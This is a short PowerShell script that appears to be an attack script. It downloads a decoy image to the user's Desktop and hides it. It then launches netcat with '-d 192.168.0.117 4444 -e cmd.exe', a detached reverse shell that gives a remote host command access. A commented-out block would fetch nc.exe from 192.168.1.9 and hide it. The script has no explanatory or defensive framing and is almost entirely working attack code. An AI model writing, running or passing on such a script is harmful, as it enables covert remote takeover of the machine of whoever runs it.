$ncUrl = "http://192.168.1.9/nc.exe"
$imageUrl = "https://images.pexels.com/photos/1804035/pexels-photo-1804035.jpeg"
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
$ncFileName = "nc.exe"
$imageFileName = "handsomeloi.jpg"
$ncFinalPath = Join-Path -Path $desktopPath -ChildPath $ncFileName
$imageFinalPath = Join-Path -Path $desktopPath -ChildPath $imageFileName

try {
    # Write-Host "Downloading nc.exe..."
    # $ncDownload = Invoke-WebRequest -Uri $ncUrl -OutFile $ncFinalPath -ErrorAction Stop
    # Set-ItemProperty -Path $ncFinalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    # Write-Host "nc.exe downloaded and hidden."

    Write-Host "Downloading handsomeloi.jpg..."
    $imageDownload = Invoke-WebRequest -Uri $imageUrl -OutFile $imageFinalPath -ErrorAction Stop
    Set-ItemProperty -Path $imageFinalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    Write-Host "handsomeloi.jpg downloaded and hidden."

    # Define the parameters for the executable
    $params = "-d 192.168.0.117 4444 -e cmd.exe"

    Write-Host "Executing nc.exe..."
    Start-Process -FilePath $ncFinalPath -ArgumentList $params -ErrorAction Stop
    Write-Host "nc.exe execution complete."
}
catch {
    Write-Host "Error: $_"
    # You can add specific error handling here, like logging errors or informing the user
}
